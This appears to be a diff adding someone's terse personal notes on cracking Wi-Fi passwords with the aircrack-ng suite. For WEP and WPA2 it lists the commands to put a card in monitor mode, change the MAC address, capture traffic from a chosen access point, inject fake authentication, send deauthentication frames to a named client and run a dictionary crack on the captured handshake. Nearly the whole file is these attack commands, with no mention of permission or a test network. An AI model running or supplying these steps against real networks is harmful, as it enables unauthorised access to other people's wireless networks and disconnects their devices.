@@ -1,0 +1,32 @@
+1. WEP
+1.1
+	# airmon-ng --> inspect wireless network devices
+1.2
+	# airmon-ng stop wlan0  OR # ifconfig wlan0 down --> shut down wlan0
+1.3 
+	change MAC
+	ifconfig ? ip ?
+1.4 re-start wlan0
+	airmon-ng start wlan0
+	hint: rfkill - may cause issue.
+1.5 dump avaliable network near.
+	airodump-ng wlan0
+1.6 choose target
+	airodump-ng –c 1 –w wireless --bssid aa:bb:cc:dd:ee:ff mon0
+	new window aireplay-ng -1 0 -a [BSSID] -h [our Chosen MAC address] -e [ESSID] [Interface]
+1.7 crack
+	aircrack-ng -b MAC wireless-01.cap
+
+2. WPA2
+2.1 
+	as above, prepare mon0
+2.2 capture packets
+	airodump-ng -c 1 -w abc --bssid 14:E6:E4:AC:FB:20 mon0
+2.3 attack router using Deauth
+	aireplay-ng --deauth 1 -a 14:E6:E4:AC:FB:20 -c 00:11:22:33:44:55 mon0
+2.4 crack 
+	aircrack-ng -w ./dic/wordlist wirelessattack-01.cap
+
+3. using gerix wifi cracker
+	it is a frontend for aircrack-ng
+
